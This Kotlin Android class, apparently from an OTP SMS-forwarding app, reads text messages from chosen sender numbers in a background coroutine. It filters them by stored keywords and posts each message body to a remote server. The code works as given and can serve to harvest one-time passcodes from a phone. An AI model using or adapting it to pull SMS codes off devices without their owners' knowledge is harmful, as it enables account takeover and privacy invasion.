package com.teamup.amazingoptsmssend.Serves

import android.content.ContentValues.TAG
import android.content.Context
import android.util.Log
import com.teamup.amazingoptsmssend.URLS.MAINURL
import com.teamup.amazingoptsmssend.api.BooleanSharedPreferences
import com.teamup.amazingoptsmssend.api.MyShared
import com.teamup.amazingoptsmssend.api.SharedPreferencesHelper
import com.teamup.amazingoptsmssend.api.getSMSList
import com.teamup.amazingoptsmssend.api.getSMSListLastHour
import com.teamup.amazingoptsmssend.data.ApiService
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory


class SandDate(context: Context, ph: String) {
    private val retrofit = Retrofit.Builder()
        .baseUrl(MAINURL)
        .addConverterFactory(GsonConverterFactory.create())
        .build()

    private val apiService = retrofit.create(ApiService::class.java)
    val helper = SharedPreferencesHelper(context)

    init {
        GlobalScope.launch {
            val booleanSharedPreferences = BooleanSharedPreferences(context)
            if (booleanSharedPreferences.getBoolean("24")){
                getSMSList(ph, context).forEach { sms ->
                    delay(2000)
                    if (booleanSharedPreferences.getBoolean(ph) && !helper.containsValue(ph, sms)) {
                        val shouldSend = if (MyShared(context, ph).getValueList().isEmpty()) {
                            true
                        } else {
                            MyShared(context, ph).getValueList().any { it in sms }
                        }
                        if (shouldSend) {
                            sendDataToServer(sms)
                            helper.addToList(ph, sms)
                        }
                    }
                }
            }else{
                getSMSListLastHour(ph, context).forEach { sms ->
                    delay(2000)
                    if (booleanSharedPreferences.getBoolean(ph) && !helper.containsValue(ph, sms)) {
                        val shouldSend = if (MyShared(context, ph).getValueList().isEmpty()) {
                            true
                        } else {
                            MyShared(context, ph).getValueList().any { it in sms }
                        }
                        if (shouldSend) {
                            sendDataToServer(sms)
                            helper.addToList(ph, sms)
                        }
                    }
                }
            }

            }
    }

    private fun sendDataToServer(data: String) {
        apiService.sendData(data).enqueue(object : Callback<Void> {
            override fun onResponse(call: Call<Void>, response: Response<Void>) {
                if (response.isSuccessful) {
                    Log.d(TAG, "onResponse: ${response.body()}")
                } else {
                    Log.d(TAG, "onResponse:${response.body()}")
                }
            }

            override fun onFailure(call: Call<Void>, t: Throwable) {
                Log.d(TAG, "onResponse: $t")
            }
        })
    }
}
